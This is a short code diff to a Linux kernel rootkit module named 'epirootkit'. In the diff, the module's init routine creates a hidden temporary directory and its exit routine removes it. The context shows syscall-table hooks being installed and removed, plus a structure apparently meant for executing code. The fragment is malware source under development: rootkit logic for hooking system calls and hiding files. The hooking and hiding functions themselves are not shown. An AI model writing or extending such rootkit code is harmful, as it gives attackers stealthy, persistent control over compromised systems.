@@ -35,8 +35,13 @@ static int __init epirootkit_init(void) {
     int err;
     err = fh_install_hooks(hooks, hook_array_size);
     if (err) {
-        printk(KERN_ERR "my_module: failed to install hooks: %d\n", err);
+        ERR_MSG("epirootkit: epirootkit_init: failed to install hooks\n");
         return err;
+    }
+
+    if (create_hidden_tmp_dir() != SUCCESS) {
+        ERR_MSG("epirootkit: epirootkit_init: failed to create hidden tmp dir\n");
+        return -ENOMEM;
     }
 
     // Init structure for exec_code_stds
@@ -89,6 +94,11 @@ static void __exit epirootkit_exit(void) {
 
     // Remove hooks from the syscall table
     fh_remove_hooks(hooks, hook_array_size);
+
+    // Remove the hidden directory
+    if (remove_hidden_tmp_dir() != SUCCESS) {
+        ERR_MSG("epirootkit: epirootkit_exit: failed to remove hidden tmp dir\n");
+    }
 
     DBG_MSG("epirootkit: epirootkit_exit: module unloaded\n");
 }
